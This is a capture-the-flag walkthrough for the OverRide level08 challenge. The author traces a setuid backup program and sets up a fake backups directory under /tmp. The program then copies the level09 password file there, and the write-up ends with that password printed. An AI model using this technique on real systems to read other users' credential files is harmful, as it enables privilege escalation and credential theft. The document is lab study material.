# The program is reading a file then storing its content to /backups/**PATH**
# When trying to reverse the binary, i managed to make it work in my local env
# Then i was able to ltrace its comportment

level08@OverRide:/tmp$ ltrace ~/level08 zizi.txt
__libc_start_main(0x4009f0, 2, 0x7fffffffe6b8, 0x400c60, 0x400cf0 <unfinished ...>
fopen("./backups/.log", "w")                            = 0x603010
strcpy(0x7fffffffe400, "Starting back up: ")            = 0x7fffffffe400

snprintf(NULL, 140737488349413, "")                     = 8
strcspn("Starting back up: zizi.txt", "\n")             = 26
fprintf(0x603010, "LOG: %s\n", "Starting back up: zizi.txt") = 32
fopen("zizi.txt", "r")                                  = 0x603250
strncat(0x7fffffffe560, 0x7fffffffe8e5, 89, 0x7fffffffe8e5, 0) = 0x7fffffffe560
open("./backups/zizi.txt", 193, 0660)                   = 5
fgetc(0x603250)                                         = 's'
write(5, "s", 1)                                        = 1
fgetc(0x603250)                                         = 'a'
write(5, "a", 1)                                        = 1
fgetc(0x603250)                                         = 'l'
write(5, "l", 1)                                        = 1
fgetc(0x603250)                                         = 'u'
write(5, "u", 1)                                        = 1
fgetc(0x603250)                                         = 't'
write(5, "t", 1)                                        = 1
fgetc(0x603250)                                         = '\n'
write(5, "\n", 1)                                       = 1
fgetc(0x603250)                                         = 'EOF'
strcpy(0x7fffffffe400, "Finished back up ")             = 0x7fffffffe400
snprintf(NULL, 140737488349413, "")                     = 8
strcspn("Finished back up zizi.txt", "\n")              = 25
fprintf(0x603010, "LOG: %s\n", "Finished back up zizi.txt") = 31
fclose(0x603250)                                        = 0
close(5)                                                = 0
+++ exited (status 0) +++

# Ok, like in snowcrash we should be able to read the flag with the program
# Since its running under level09 user

# When trying to ltrace, i understood that i had to call the program from a path
# With all the environment set (backups, backups/.log) at its root

# Under the VM, the only folder with creation rights is /tmp
# Let's create our environment under /tmp then call level08 from here
level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass

=================ENVIRONMENT CREATION========================

level08@OverRide:/tmp$ mkdir -p backups/home/users/level09
level08@OverRide:/tmp$ touch backups/.log

# Note that i must not create the .pass file or it won't work
level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass

level08@OverRide:/tmp$ chmod -R 777 backups
level08@OverRide:/tmp$ ls -laR
.:
total 0
drwxrwxrwt 3 root    root     60 Aug 12 15:17 .
drwxr-xr-x 1 root    root    220 Aug 12 09:49 ..
drwxrwxrwx 3 level08 level08  80 Aug 12 15:15 backups

./backups:
total 0
drwxrwxrwx 3 level08 level08 80 Aug 12 15:15 .
drwxrwxrwt 3 root    root    60 Aug 12 15:17 ..
drwxrwxrwx 3 level08 level08 60 Aug 12 15:14 home
-rwxrwxrwx 1 level08 level08  0 Aug 12 15:15 .log

./backups/home:
total 0
drwxrwxrwx 3 level08 level08 60 Aug 12 15:14 .
drwxrwxrwx 3 level08 level08 80 Aug 12 15:15 ..
drwxrwxrwx 3 level08 level08 60 Aug 12 15:14 users

./backups/home/users:
total 0
drwxrwxrwx 3 level08 level08 60 Aug 12 15:14 .
drwxrwxrwx 3 level08 level08 60 Aug 12 15:14 ..
drwxrwxrwx 2 level08 level08 40 Aug 12 15:14 level09

./backups/home/users/level09:
total 0
drwxrwxrwx 2 level08 level08 40 Aug 12 15:14 .
drwxrwxrwx 3 level08 level08 60 Aug 12 15:14 ..

level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
level08@OverRide:/tmp$ cat backups/home/users/level09/.pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
